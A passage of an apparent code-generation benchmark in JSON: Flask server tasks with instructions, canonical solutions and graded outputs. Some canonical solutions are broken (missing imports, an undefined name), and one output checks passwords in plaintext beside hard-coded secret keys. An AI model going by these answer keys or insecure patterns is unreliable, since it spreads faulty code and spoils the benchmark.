self.setup[key]\n        self.app.config['UPLOAD_DIR'] = \"\"\n\n        self.app.config['MESSENGER'] = WebMessenger()\n\n        @self.app.route('/')\n        @login_required\n        def index():\n            return redirect(url_for('search'))\n\n        @self.app.route('/search/', methods=['GET', 'POST'])\n        @login_required\n        def search(term=\"\"):\n            if request.method == 'POST':\n                field = 'value'\n                query = [{field: r.strip()} for r in request.form['bulk-text'].split('\\r\\n') if r.strip() != '']\n                result_set = self.app.config['MODEL'].find({'$or': query})\n            else:\n                query = request.args.get('query', False)\n                if query:\n                    query = query.strip()\n                field = request.args.get('field', 'value').strip()\n                if not bool(request.args.get('strict', False)):\n                    result_set = self.app.config['MODEL'].find({field: query})\n                else:\n                    result_set = self.app.config['MODEL'].find({field: re.compile(re.escape(query), re.IGNORECASE)})\n\n            if query == False:\n                return render_template('search.html', history=self.app.config['MODEL'].get_history())\n            elif query == \"\":\n                flash('Empty search query is empty.')\n                return redirect(url_for('search'))\n\n            base_elts = []\n            base_ids = []\n            evil_elts = {}\n\n            for e in result_set:\n                base_elts.append(e)\n                base_ids.append(e['_id'])\n                if 'evil' in e['tags']:\n                    evil_elts[e['_id']] = e\n\n            if len(base_elts) == 0 and request.method == 'GET':\n                if not bool(request.args.get('log', False)):\n                    flash('\"{}\" was not found. Use the checkbox above to add it to the database'.format(query))\n                    return render_template('search.html', term=query, history=self.app.config['MODEL'].get_history())\n                else:\n                    new = self.app.config['MODEL'].add_text([query], tags=['search'])\n                    if new:\n                        flash('\"{}\" was not found. It was added to the database (ID: {})'.format(query, new['_id']))\n                        self.app.config['MODEL'].add_to_history(query)\n                    else:\n                        flash('\"{}\" did not convert to a viable datatype'.format(query))\n                    return render_template('search.html', term=query, history=self.app.config['MODEL'].get_history())\n\n            if len(base_elts) == 0 and request.method == 'POST':\n                flash('Your query did not yield any results. Use the checkbox above to add it to the database')\n                return render_template('search.html', history=self.app.config['MODEL'].get_history())\n\n            return find_related(field, query, base_elts, base_ids, evil_elts)\n\n        self.http_server = WSGIServer((self.listen_interface, self.listen_port), self.app, handler_class=WebSocketHandler)\n        self.http_server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, Response, session, redirect, url_for, render_template_string\nfrom flask_wtf.csrf import CsrfProtect\nfrom geventwebsocket.handler import WebSocketHandler\nfrom gevent.pywsgi import WSGIServer\nfrom multiprocessing import Process\nimport wtforms\n\nclass MalcomWeb(Process):\n    def __init__(self, auth, listen_port, listen_interface, setup):\n        super(MalcomWeb, self).__init__()\n        self.listen_port = listen_port\n        self.listen_interface = listen_interface\n        self.setup = setup\n        self.auth = auth\n        self.app = Flask(__name__)\n        self.app.secret_key = 'your_secret_key'\n        CsrfProtect(self.app)\n        self.http_server = None\n\n        @self.app.route('/')\n        def index():\n            if not self.auth.is_authenticated(session):\n                return redirect(url_for('login'))\n            return self.index()\n\n        @self.app.route('/search', methods=['GET', 'POST'])\n        def search():\n            if not self.auth.is_authenticated(session):\n                return redirect(url_for('login'))\n            term = request.args.get('term', '') or request.form.get('term', '')\n            return self.search(term)\n\n        @self.app.route('/login', methods=['GET', 'POST'])\n        def login():\n            form = LoginForm()\n            if form.validate_on_submit():\n                if self.auth.authenticate(form.username.data, form.password.data):\n                    session['authenticated'] = True\n                    return redirect(url_for('index'))\n            return render_template_string('''\n                <form method=\"post\">\n                    {{ form.hidden_tag() }}\n                    <p>{{ form.username.label }} {{ form.username }}</p>\n                    <p>{{ form.password.label }} {{ form.password }}</p>\n                    <p><input type=\"submit\" value=\"Login\"></p>\n                </form>\n            ''', form=form)\n\n        @self.app.route('/logout')\n        def logout():\n            session.pop('authenticated', None)\n            return redirect(url_for('login'))\n\n    def run(self):\n        self.start_server()\n\n    def stop_server(self):\n        if self.http_server:\n            self.http_server.stop()\n\n    def start_server(self):\n        self.http_server = WSGIServer((self.listen_interface, self.listen_port), self.app, handler_class=WebSocketHandler)\n        self.http_server.serve_forever()\n\n    def index(self):\n        return \"Welcome to MalcomWeb!\"\n\n    def search(self, term=\"\"):\n        results = []\n        if term:\n            results = self.setup['data_model'].search(term)\n        return render_template_string('''\n            <h1>Search</h1>\n            <form method=\"post\">\n                <input type=\"text\" name=\"term\" value=\"{{ term }}\">\n                <input type=\"submit\" value=\"Search\">\n            </form>\n            <ul>\n            {% for result in results %}\n                <li>{{ result }}</li>\n            {% endfor %}\n            </ul>\n        ''', term=term, results=results)\n\nclass LoginForm(wtforms.Form):\n    username = wtforms.StringField('Username', [wtforms.validators.DataRequired()])\n    password = wtforms.PasswordField('Password', [wtforms.validators.DataRequired()])"
  },
  {
    "Task_id": 152,
    "Instruction": "Task Description: Create a Flask-based REST API for user management with configurable behaviors for testing various API scenarios.\n\nClass Description: FlaskAPI is a class that implements a RESTful API server using Flask. It provides endpoints for user CRUD operations and order deletion, with configurable behaviors to simulate different API response scenarios for testing purposes.\n\nAttributes:\n\napp: [Flask] - The Flask application instance\nconfig: [AppConfig] - Configuration object controlling API behavior\nnext_user_id: [int] - Counter for generating new user IDs\nlast_modified: [str] - Timestamp for last modification\nusers: [dict] - Dictionary storing user data\ndeleted_orders: [set] - Set tracking deleted order IDs\n\nMethods:\n\n__init__: [None]() -> [None] - Initializes the Flask application and sets up routes\n_setup_routes: [None]() -> [None] - Private method that defines all API endpoints\nget_spec: [None]() -> [Response] - Returns OpenAPI specification\nget_user: [None](user_id: int) -> [Response] - Retrieves a user by ID\nlist_users: [None]() -> [Response] - Lists all users\ncreate_user: [None]() -> [Response] - Creates a new user\nupdate_user: [None](user_id: int) -> [Response] - Updates a user by ID\ndelete_user: [None](user_id: int) -> [Response] - Deletes a user by ID\ndelete_order: [None](order_id: str) -> [Response] - Handles order deletion\ncheck_auth: [None]() -> [None] - Middleware for authorization checking",
    "Canonical_solution": "from flask import Flask, jsonify, request\nfrom typing import Literal, Union\nfrom dataclasses import dataclass\n\n@dataclass\nclass AppConfig:\n    use_after_free: bool = False\n    ensure_resource_availability: bool = False\n    merge_body: bool = True\n    independent_500: bool = False\n    failure_behind_failure: bool = False\n    multiple_conformance_issues: bool = False\n    unsatisfiable: bool = False\n    custom_headers: dict | None = None\n    multiple_source_links: bool = False\n    auth_token: str | None = None\n    ignored_auth: bool = False\n    slowdown: float | int | None = None\n    multiple_incoming_links_with_same_status: bool = False\n    duplicate_operation_links: bool = False\n    circular_links: bool = False\n    invalid_parameter: bool = False\n    list_users_as_root: bool = False\n    no_reliable_transitions: bool = False\n    return_plain_text: Literal[False] | str | bytes = False\n    omit_required_field: bool = False\n\nclass FlaskAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.config = AppConfig()\n        self.next_user_id = 1\n        self.last_modified = \"2021-01-01T00:00:00Z\"\n        self.users = {0: {\"id\": 0, \"name\": \"John Doe\", \"last_modified\": self.last_modified}}\n        self.deleted_orders = set()\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route(\"/openapi.json\", methods=[\"GET\"])\n        def get_spec():\n            return jsonify(self.app.config[\"schema\"])\n\n        @self.app.route(\"/users/<int:user_id>\", methods=[\"GET\"])\n        def get_user(user_id):\n            if self.config.slowdown:\n                time.sleep(self.config.slowdown)\n            user = self.users.get(user_id)\n            if user:\n                if self.config.return_plain_text is not False:\n                    return self.config.return_plain_text, 200, {\"Content-Type\": \"text/plain\"}\n                if self.config.omit_required_field:\n                    return jsonify({\"name\": user[\"name\"], \"last_modified\": user[\"last_modified\"]})\n                return jsonify(user)\n            return jsonify({\"error\": \"User not found\"}), 404\n\n        @self.app.route(\"/users\", methods=[\"GET\"])\n        def list_users():\n            return jsonify(self.users)\n\n        @self.app.route(\"/users\", methods=[\"POST\"])\n        def create_user():\n            if self.config.slowdown:\n                time.sleep(self.config.slowdown)\n            data = request.get_json()\n            if not isinstance(data, dict):\n                return jsonify({\"error\": \"Invalid input\"}), 400\n            name = data.get(\"name\")\n            if name is None:\n                return jsonify({\"error\": \"Name is required\"}), 400\n\n            new_user = {\"id\": self.next_user_id, \"name\": name, \"last_modified\": self.last_modified}\n            if not self.config.ensure_resource_availability:\n                self.users[self.next_user_id] = new_user\n            self.next_user_id += 1\n\n            if self.config.omit_required_field:\n                return jsonify({\"name\": new_user[\"name\"], \"last_modified\": new_user[\"last_modified\"]}), 201\n            return jsonify(new_user), 201\n\n        @self.app.route(\"/users/<int:user_id>\", methods=[\"PATCH\"])\n        def update_user(user_id):\n            if self.config.slowdown:\n                time.sleep(self.config.slowdown)\n            user = self.users.get(user_id)\n            if user:\n                data = request.get_json()\n                if not self.config.merge_body:\n                    assert len(data) == 1\n                else:\n                    assert \"name\" in data\n                    user[\"name\"] = data[\"name\"]\n                return jsonify(user)\n            return jsonify({\"error\": \"User not found\"}), 404\n\n        @self.app.route(\"/users/<int:user_id>\", methods=[\"DELETE\"])\n        def delete_user(user_id):\n            if self.config.slowdown:\n                time.sleep(self.config.slowdown)\n            user = self.users.get(user_id)\n            if user:\n                if self.config.use_after_free:\n                    if len(user[\"name\"]) < 10:\n                        del self.users[user_id]\n                else:\n                    del self.users[user_id]\n                return jsonify({\"message\": \"User deleted successfully\"}), 204\n            return jsonify({\"error\": \"User not found\"}), 404\n\n        @self.app.route(\"/orders/<order_id>\", methods=[\"DELETE\"])\n        def delete_order(order_id):\n            if self.config.slowdown:\n                time.sleep(self.config.slowdown)\n            if order_id in self.deleted_orders:\n                return jsonify({\"error\": \"Order not found\"}), 404\n            self.deleted_orders.add(order_id)\n            return jsonify({\"message\": \"Nothing happened\"}), 200\n\n        @self.app.before_request\n        def check_auth():\n            if not (self.config.ignored_auth or self.config.auth_token is None or request.endpoint == get_spec.__name__):\n                auth_header = request.headers.get(\"Authorization\")\n                if not auth_header:\n                    abort(401, description=\"Authorization header is missing\")\n                try:\n                    token_type, token = auth_header.split()\n                    if token_type.lower() != \"bearer\" or token != self.config.auth_token:\n                        abort(401, description=\"Invalid token\")\n                except ValueError:\n                    abort(401, description=\"Invalid Authorization header format\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nfrom functools import wraps\nimport time\n\nclass AppConfig:\n    def __init__(self, enable_auth=False, auth_token=None, enable_rate_limit=False, rate_limit=10, delay_response=0):\n        self.enable_auth = enable_auth\n        self.auth_token = auth_token\n        self.enable_rate_limit = enable_rate_limit\n        self.rate_limit = rate_limit\n        self.delay_response = delay_response\n        self.error_mode = False\n\nclass FlaskAPI:\n    def __init__(self, config=None):\n        self.app = Flask(__name__)\n        self.config = config or AppConfig()\n        self.next_user_id = 1\n        self.last_modified = time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.gmtime())\n        self.users = {}\n        self.deleted_orders = set()\n        \n        self._setup_routes()\n\n    def _setup_routes(self):\n        def require_auth(f):\n            @wraps(f)\n            def decorated(*args, **kwargs):\n                if self.config.enable_auth:\n                    token = request.headers.get('Authorization')\n                    if token != self.config.auth_token:\n                        return jsonify({'error': 'Unauthorized'}), 401\n                return f(*args, **kwargs)\n            return decorated\n\n        def rate_limit(f):\n            @wraps(f)\n            def decorated(*args, **kwargs):\n                if self.config.enable_rate_limit:\n                    # Simple in-memory rate limiting for demonstration\n                    client_ip = request.remote_addr\n                    # In a real implementation, we'd track requests per window\n                    # Here we just simulate it with a basic counter\n                    if not hasattr(self, '_request_counts'):\n                        self._request_counts = {}\n                    self._request_counts[client_ip] = self._request_counts.get(client_ip, 0) + 1\n                    if self._request_counts[client_ip] > self.config.rate_limit:\n                        return jsonify({'error': 'Too Many Requests'}), 429\n                return f(*args, **kwargs)\n            return decorated\n\n        def delayed_response(f):\n            @wraps(f)\n            def decorated(*args, **kwargs):\n                if self.config.delay_response > 0:\n                    time.sleep(self.config.delay_response / 1000.0)\n                return f(*args, **kwargs)\n            return decorated\n\n        def handle_error(f):\n            @wraps(f)\n            def decorated(*args, **kwargs):\n                if self.config.error_mode:\n                    return jsonify({'error': 'Internal Server Error'}), 500\n                try:\n                    return f(*args, **kwargs)\n                except Exception as e:\n                    return jsonify({'error': str(e)}), 500\n            return decorated\n\n        decorator_chain = [handle_error, delayed_response, require_auth, rate_limit]\n\n        def apply_decorators(f):\n            for dec in reversed(decorator_chain):\n                f = dec(f)\n            return f\n\n        @self.app.route('/spec')\n        @apply_decorators\n        def get_spec():\n            spec = {\n                \"openapi\": \"3.0.0\",\n                \"info\": {\n                    \"title\": \"User Management API\",\n                    \"version\": \"1.0.0\"\n                },\n                \"paths\": {\n                    \"/users\": {\n                        \"get\": {\"summary\": \"List all users\"},\n                        \"post\": {\"summary\": \"Create a new user\"}\n                    },\n                    \"/users/<int:user_id>\": {\n                        \"get\": {\"summary\": \"Get user by ID\"},\n                        \"put\": {\"summary\": \"Update user by ID\"},\n                        \"delete\": {\"summary\": \"Delete user by ID\"}\n                    },\n                    \"/orders/<string:order_id>\": {\n                        \"delete\": {\"summary\": \"Delete order by ID\"}\n                    }\n                }\n            }\n            return jsonify(spec)\n\n        @self.app.route('/users')\n        @apply_decorators\n        def list_users():\n            return jsonify(list(self.users.values()))\n\n        @self.app.route('/users/<int:user_id>')\n        @apply_decorators\n        def get_user(user_id):\n            user = self.users.get(user_id)\n            if not user:\n                return jsonify({'error': 'User not found'}), 404\n            return jsonify(user)\n\n        @self.app.route('/users', methods=['POST'])\n        @apply_decorators\n        def create_user():\n            data = request.get_json()\n            if not data or 'name' not in data or 'email' not in data:\n                return jsonify({'error': 'Missing name or email'}), 400\n            \n            user = {\n                'id': self.next_user_id,\n                'name': data['name'],\n                'email': data['email']\n            }\n            self.users[self.next_user_id] = user\n            self.next_user_id += 1\n            self.last_modified = time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.gmtime())\n            \n            response = jsonify(user)\n            response.headers['Location'] = f'/users/{user[\"id\"]}'\n            return response, 201\n\n        @self.app.route('/users/<int:user_id>', methods=['PUT'])\n        @apply_decorators\n        def update_user(user_id):\n            if user_id not in self.users:\n                return jsonify({'error': 'User not found'}), 404\n                \n            data = request.get_json()\n            if not data or ('name' not in data and 'email' not in data):\n                return jsonify({'error': 'Missing name or email to update'}), 400\n            \n            user = self.users[user_id]\n            if 'name' in data:\n                user['name'] = data['name']\n            if 'email' in data:\n                user['email'] = data['email']\n                \n            self.last_modified = time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.gmtime())\n            return jsonify(user)\n\n        @self.app.route('/users/<int:user_id>', methods=['DELETE'])\n        @apply_decorators\n        def delete_user(user_id):\n            if user_id not in self.users:\n                return jsonify({'error': 'User not found'}), 404\n                \n            del self.users[user_id]\n            self.last_modified = time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.gmtime())\n            return jsonify({'message': 'User deleted successfully'})\n\n        @self.app.route('/orders/<string:order_id>', methods=['DELETE'])\n        @apply_decorators\n        def delete_order(order_id):\n            if order_id in self.deleted_orders:\n                return jsonify({'error': 'Order already deleted'}), 400\n                \n            self.deleted_orders.add(order_id)\n            return jsonify({'message': f'Order {order_id} marked for deletion'})\n\n    def run(self, *args, **kwargs):\n        self.app.run(*args, **kwargs)"
  },
  {
    "Task_id": 153,
    "Instruction": "Task Description: Create a Flask-based HTTP server class that handles user authentication, request rate limiting, and database interactions, with the ability to run in both development and production environments.\n\nClass Description: FlaskServer is a class that encapsulates a Flask web application with user authentication, rate limiting, and database connectivity features. It provides routes for main page display and user login functionality, along with supporting methods for database operations and request handling.\n\nAttributes:\n- app: Flask - The Flask application instance\n- limiter: Limiter - Rate limiting controller for the application\n- SECRET_KEY: str - Secret key for session management\n\nMethods:\n- __init__() -> None - Initializes the Flask application, sets up rate limiting, and configures routes and secret key\n- _setup_routes() -> None - Defines all application routes and request handlers (internal method)\n- connect_db() -> sqlite3.Connection - Establishes connection to SQLite database\n- query_db(query: str, args: tuple = (), one: bool = False) -> Union[list, dict, None] - Executes database query and returns results\n- get_user_id(username: str) -> Union[int, None] - Retrieves user ID from database by username\n- papers_filter_version(papers: list, v: str) -> list - Filters papers by version number\n- default_context(papers: list, **kws) -> dict - Creates default template context with papers data\n- run(port: int = 5000, debug: bool = False, prod: bool = False) -> None - Starts the server in either development or production mode\n\nRoute Handlers (defined in _setup_routes):\n- before_request() -> None - Sets up database connection and user session before each request\n- teardown_request(exception: Exception) -> None - Closes database connection after each request\n- intmain() -> str - Handles root route, displays main page with papers\n- login() -> Response - Handles user login POST requests, manages authentication",
    "Canonical_solution": "from flask import Flask, request, session, url_for, redirect, render_template, abort, g, flash, _app_ctx_stack\nfrom flask_limiter import Limiter\nfrom werkzeug import check_password_hash, generate_password_hash\nimport pymongo\nimport time\nfrom sqlite3 import dbapi2 as sqlite3\n\nclass FlaskServer:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.limiter = Limiter(self.app, global_limits=[\"100 per hour\", \"20 per minute\"])\n        self._setup_routes()\n        \n        # Database configuration\n        if os.path.isfile('secret_key.txt'):\n            SECRET_KEY = open('secret_key.txt', 'r').read()\n        else:\n            SECRET_KEY = 'devkey, should be in a file'\n        self.app.config['SECRET_KEY'] = SECRET_KEY\n\n    def _setup_routes(self):\n        @self.app.before_request\n        def before_request():\n            g.db = self.connect_db()\n            g.user = None\n            if 'user_id' in session:\n                g.user = self.query_db('select * from user where user_id = ?',\n                                    [session['user_id']], one=True)\n\n        @self.app.teardown_request\n        def teardown_request(exception):\n            db = getattr(g, 'db', None)\n            if db is not None:\n                db.close()\n\n        @self.app.route(\"/\")\n        def intmain():\n            vstr = request.args.get('vfilter', 'all')\n            papers = [db[pid] for pid in DATE_SORTED_PIDS]\n            papers = self.papers_filter_version(papers, vstr)\n            ctx = self.default_context(papers, render_format='recent',\n                                    msg='Showing most recent Arxiv papers:')\n            return render_template('main.html', **ctx)\n\n        @self.app.route('/login', methods=['POST'])\n        def login():\n            if not request.form['username']:\n                flash('You have to enter a username')\n            elif not request.form['password']:\n                flash('You have to enter a password')\n            elif self.get_user_id(request.form['username']) is not None:\n                user = self.query_db('''select * from user where\n                    username = ?''', [request.form['username']], one=True)\n                if check_password_hash(user['pw_hash'], request.form['password']):\n                    session['user_id'] = self.get_user_id(request.form['username'])\n                    flash('User ' + request.form['username'] + ' logged in.')\n                else:\n                    flash('User ' + request.form['username'] + ' already exists, wrong password.')\n            else:\n                creation_time = int(time.time())\n                g.db.execute('''insert into user (username, pw_hash, creation_time) values (?, ?, ?)''',\n                    [request.form['username'], \n                    generate_password_hash(request.form['password']), \n                    creation_time])\n                user_id = g.db.execute('select last_insert_rowid()').fetchall()[0][0]\n                g.db.commit()\n                session['user_id'] = user_id\n                flash('New account %s created' % (request.form['username'], ))\n            return redirect(url_for('intmain'))\n\n    def connect_db(self):\n        sqlite_db = sqlite3.connect(Config.database_path)\n        sqlite_db.row_factory = sqlite3.Row\n        return sqlite_db\n\n    def query_db(self, query, args=(), one=False):\n        cur = g.db.execute(query, args)\n        rv = cur.fetchall()\n        return (rv[0] if rv else None) if one else rv\n\n    def get_user_id(self, username):\n        rv = self.query_db('select user_id from user where username = ?',\n                        [username], one=True)\n        return rv[0] if rv else None\n\n    def papers_filter_version(self, papers, v):\n        if v != '1': \n            return papers\n        intv = int(v)\n        filtered = [p for p in papers if p['_version'] == intv]\n        return filtered\n\n    def default_context(self, papers, **kws):\n        top_papers = self.encode_json(papers, args.num_results)\n        ans = dict(papers=top_papers, numresults=len(papers), totpapers=len(db), tweets=[], msg='', show_prompt='no', pid_to_users={})\n        ans.update(kws)\n        return ans\n\n    def run(self, port=5000, debug=False, prod=False):\n        if prod:\n            from tornado.wsgi import WSGIContainer\n            from tornado.httpserver import HTTPServer\n            from tornado.ioloop import IOLoop\n            from tornado.log import enable_pretty_logging\n            enable_pretty_logging()\n            http_server = HTTPServer(WSGIContainer(self.app))\n            http_server.listen(port)\n            IOLoop.instance().start()\n        else:\n            self.app.debug = debug\n            self.app.run(port=port, host='0.0.0.0')",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "import sqlite3\nfrom flask import Flask, request, session, redirect, url_for, render_template, g\nfrom flask_limiter import Limiter\nfrom flask_limiter.util import get_remote_address\nfrom typing import Union, List, Dict, Any\n\nclass FlaskServer:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.SECRET_KEY = 'dev_key_123'\n        self.app.config['DATABASE'] = 'papers.db'\n        self.limiter = Limiter(\n            app=self.app,\n            key_func=get_remote_address,\n            default_limits=[\"200 per day\", \"50 per hour\"]\n        )\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.before_request\n        def before_request():\n            g.db = self.connect_db()\n            if 'user_id' in session:\n                g.user = self.query_db('SELECT * FROM users WHERE id = ?', (session['user_id'],), one=True)\n            else:\n                g.user = None\n\n        @self.app.teardown_request\n        def teardown_request(exception):\n            if hasattr(g, 'db'):\n                g.db.close()\n\n        @self.app.route('/')\n        def intmain():\n            papers = self.query_db('SELECT * FROM papers')\n            context = self.default_context(papers)\n            return render_template('index.html', **context)\n\n        @self.app.route('/login', methods=['POST'])\n        @self.limiter.limit(\"10 per minute\")\n        def login():\n            username = request.form.get('username')\n            password = request.form.get('password')\n            user = self.query_db('SELECT * FROM users WHERE username = ?', (username,), one=True)\n            \n            if user and user['password'] == password:\n                session['user_id'] = user['id']\n                return redirect(url_for('intmain'))\n            return redirect(url_for('intmain'))\n\n    def connect_db(self) -> sqlite3.Connection:\n        return sqlite3.connect(self.app.config['DATABASE'])\n\n    def query_db(self, query: str, args: tuple = (), one: bool = False) -> Union[List[Dict], Dict, None]:\n        cur = g.db.execute(query, args)\n        rv = [dict((cur.description[idx][0], value) for idx, value in enumerate(row)) for row in cur.fetchall()]\n        return (rv[0] if rv else None) if one else rv\n\n    def get_user_id(self, username: str) -> Union[int, None]:\n        result = self.query_db('SELECT id FROM users WHERE username = ?', (username,), one=True)\n        return result['id'] if result else None\n\n    def papers_filter_version(self, papers: list, v: str) -> list:\n        return [paper for paper in papers if paper.get('version') == v]\n\n    def default_context(self, papers: list, **kws) -> dict:\n        context = {\n            'papers': papers,\n            'user': getattr(g, 'user', None),\n            'total_papers': len(papers),\n            'latest_paper': papers[0] if papers else None\n        }\n        context.update(kws)\n        return context\n\n    def run(self, port: int = 5000, debug: bool = False, prod: bool = False):\n        if prod:\n            from waitress import serve\n            serve(self.app, host='0.0.0.0', port=port)\n        else:\n            self.app.run(port=port, debug=debug)"
  },
  {
    "Task_id": 154,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints to handle different types of requests, including delayed responses, request type identification, and JSON responses.\n\nFunction Description: The code consists of three Flask route handlers that demonstrate different HTTP server functionalities. Each function handles a specific endpoint and performs a distinct operation.\n\nInput:\n- For '/respond' endpoint: \n  - Query parameter 'time' (integer): Time in milliseconds to sleep before responding\n- For '/request_type' endpoint: \n  - None (automatically receives request method via Flask's request object)\n- For '/json' endpoint: \n  - None\n\nOutput:\n- For '/respond' endpoint: \n  - Response text: 'Response from Flask' \n  - Headers: Sets 'Access-Control-Allow-Origin' to '*'\n- For '/request_type' endpoint: \n  - Response text: 'Request Type: [METHOD]' where [METHOD] is the HTTP method used\n  - Headers: Sets 'Access-Control-Allow-Origin' to '*'\n- For '/json' endpoint: \n  - Response: JSON object {'resp': 'Hello JSON!'}",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/request_type')\ndef request_type():\n    resp = make_response('Request Type: ' + request.method)\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/json')\ndef json():\n    return {resp:'Hello JSON!'}",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport time\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    delay = request.args.get('time', default=0, type=int)\n    time.sleep(delay / 1000.0)\n    response = app.make_response('Response from Flask')\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    return response\n\n@app.route('/request_type')\ndef request_type():\n    method = request.method\n    response = app.make_response(f'Request Type: {method}')\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    return response\n\n@app.route('/json')\ndef json_endpoint():\n    return jsonify({'resp': 'Hello JSON!'})"
  },
  {
    "Task_id": 155,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that processes Pub/Sub messages from ArgoCD, transforms them into a standardized event format, and stores them in BigQuery.\n\nFunction Description: The function processes incoming HTTP POST requests containing Pub/Sub messages from ArgoCD. It validates the message structure, decodes and processes the event data, converts it to a standardized format, and stores it in BigQuery. Error handling is included for invalid payloads or processing failures.\n\nInput: \n- HTTP POST request with JSON payload containing Pub/Sub message in the following format:\n  {\n    \"message\": {\n      \"data\": [base64-encoded string],\n      \"message_id\": [string],\n      \"attributes\": [object]\n    }\n  }\n\nOutput: \n- HTTP 204 No Content response on successful processing\n- Error responses with appropriate status codes for invalid requests\n- Side effect: Processed event data is inserted into BigQuery\n\nMethods:\n\nprocess_argocd_event:\n- Input: msg [dict] - The Pub/Sub message dictionary containing the event data\n- Returns: dict - Processed event data in standardized format\n- Description: Decodes base64 message data, extracts metadata, and creates a standardized event object with unique signature\n\nindex:\n- Input: None (handles Flask request object internally)\n- Returns: str - Empty string with HTTP 204 status code\n- Description: Main endpoint that receives Pub/Sub messages, validates them, processes through process_argocd_event, and stores in BigQuery. Handles errors and logs failures.",
    "Canonical_solution": "import base64\nimport os\nimport json\nimport shared\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\ndef process_argocd_event(msg):\n    metadata = json.loads(base64.b64decode(msg[\"data\"]).decode(\"utf-8\").strip())\n\n    # Unique hash for the event\n    signature = shared.create_unique_id(msg)\n\n    argocd_event = {\n        \"event_type\": \"deployment\",  # Event type, eg \"push\", \"pull_reqest\", etc\n        \"id\": metadata[\"id\"],  # Object ID, eg pull request ID\n        \"metadata\": json.dumps(metadata),  # The body of the msg\n        \"time_created\": metadata[\"time\"],  # The timestamp of with the event\n        \"signature\": signature,  # The unique event signature\n        \"msg_id\": msg[\"message_id\"],  # The pubsub message id\n        \"source\": \"argocd\",  # The name of the source, eg \"github\"\n    }\n\n    print(argocd_event)\n    return argocd_event\n\n@app.route(\"/\", methods=[\"POST\"])\ndef index():\n    \"\"\"\n    Receives messages from a push subscription from Pub/Sub.\n    Parses the message, and inserts it into BigQuery.\n    \"\"\"\n    event = None\n    if not request.is_json:\n        raise Exception(\"Expecting JSON payload\")\n    envelope = request.get_json()\n    print(f\"envelope recieved: {envelope}\")\n\n    # Check that data has been posted\n    if not envelope:\n        raise Exception(\"Expecting JSON payload\")\n    # Check that message is a valid pub/sub message\n    if \"message\" not in envelope:\n        raise Exception(\"Not a valid Pub/Sub Message\")\n    msg = envelope[\"message\"]\n\n    if \"attributes\" not in msg:\n        raise Exception(\"Missing pubsub attributes\")\n\n    try:\n        event = process_argocd_event(msg)\n\n        # [Do not edit below]\n        shared.insert_row_into_bigquery(event)\n\n    except Exception as e:\n        entry = {\n                \"severity\": \"WARNING\",\n                \"msg\": \"Data not saved to BigQuery\",\n                \"errors\": str(e),\n                \"json_payload\": envelope\n            }\n        print(json.dumps(entry))\n\n    return \"\", 204",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "import base64\nimport json\nimport os\nfrom flask import Flask, request, jsonify\nfrom google.cloud import bigquery\n\napp = Flask(__name__)\n\n# Initialize BigQuery client\nclient = bigquery.Client()\ntable_id = os.getenv(\"BQ_TABLE_ID\", \"your-project.your_dataset.your_table\")\n\ndef validate_pubsub_message(msg):\n    if not isinstance(msg, dict):\n        return False, \"Invalid message format: must be a JSON object\"\n    \n    required_fields = [\"message_id\", \"data\", \"attributes\"]\n    for field in required_fields:\n        if field not in msg:\n            return False, f\"Missing required field: {field}\"\n    \n    if not isinstance(msg[\"attributes\"], dict):\n        return False, \"Attributes must be a JSON object\"\n    \n    return True, \"\"\n\ndef decode_base64_data(data_str):\n    try:\n        decoded_data = base64.b64decode(data_str).decode(\"utf-8\")\n        return json.loads(decoded_data)\n    except Exception as e:\n        raise ValueError(f\"Failed to decode or parse data: {str(e)}\")\n\ndef generate_event_signature(event_data):\n    import hashlib\n    event_str = json.dumps(event_data, sort_keys=True)\n    return hashlib.sha256(event_str.encode()).hexdigest()\n\ndef process_argocd_event(msg):\n    try:\n        # Decode and parse the event data\n        raw_data = decode_base64_data(msg[\"data\"])\n        \n        # Extract metadata from attributes\n        event_type = msg[\"attributes\"].get(\"eventType\")\n        source = msg[\"attributes\"].get(\"source\")\n        \n        # Generate unique signature for the event\n        event_signature = generate_event_signature(raw_data)\n\n        processed_event = {\n            \"event_id\": msg[\"message_id\"],\n            \"event_type\": event_type,\n            \"source\": source,\n            \"signature\": event_signature,\n            \"timestamp\": raw_data.get(\"time\", raw_data.get(\"occurredAt\")),\n            \"raw_payload\": json.dumps(raw_data),\n            \"project\": raw_data.get(\"project\"),\n            \"application\": raw_data.get(\"application\"),\n            \"url\": raw_data.get(\"url\")\n        }\n\n        return processed_event\n    \n    except Exception as e:\n        raise RuntimeError(f\"Error processing event: {str(e)}\")\n\ndef store_in_bigquery(event_data):\n    try:\n        table_ref = client.dataset(\"your_dataset\").table(\"your_table\")\n        table = client.get_table(table_ref)\n\n        errors = client.insert_rows_json(table, [event_data])\n        if errors:\n            raise RuntimeError(f\"BigQuery insert errors: {errors}\")\n    except Exception as e:\n        raise RuntimeError(f\"Failed to store event in BigQuery: {str(e)}\")\n\n@app.route(\"/pubsub/argocd\", methods=[\"POST\"])\ndef index():\n    try:\n        pubsub_msg = 